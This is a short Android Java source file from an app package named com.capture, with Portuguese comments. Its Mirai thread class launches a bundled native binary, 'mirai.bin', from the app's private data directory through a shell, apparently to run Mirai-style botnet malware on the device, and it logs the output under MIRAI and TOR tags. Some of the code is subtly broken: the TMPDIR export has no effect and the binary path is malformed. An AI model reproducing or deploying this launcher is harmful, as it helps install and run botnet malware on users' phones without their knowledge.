package com.capture;

import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

public class Mirai extends Thread {
    private static boolean miraiAlreadyRunning = false;

    @Override
    public void run() {
        // Verificar se o mirai.bin já está em execução
        synchronized (Mirai.class) {
            if (miraiAlreadyRunning) {
                Log.d("MIRAI", "O processo Mirai já está em execução. Thread bloqueada.");
                return;
            }
            miraiAlreadyRunning = true;
        }

        try {
            
            String tmpDirPath = "/data/data/com.capture/tmp";
            File tmpDir = new File(tmpDirPath);
			Log.d("TOR","[TMPDIR] " + tmpDir);

            
            String exportCommand = "export TMPDIR=" + tmpDirPath;
            Runtime.getRuntime().exec(new String[]{"sh", "-c", exportCommand}).waitFor();

            
            String[] command = {"sh", "-c", "./data/data/com.capture/mirai.bin"};
            Process process = Runtime.getRuntime().exec(command);

            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                Log.d("MIRAI", "[MIRAI] " + line);
            }

           
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        } finally {
            
            synchronized (Mirai.class) {
                miraiAlreadyRunning = false;
            }
        }
    }
}

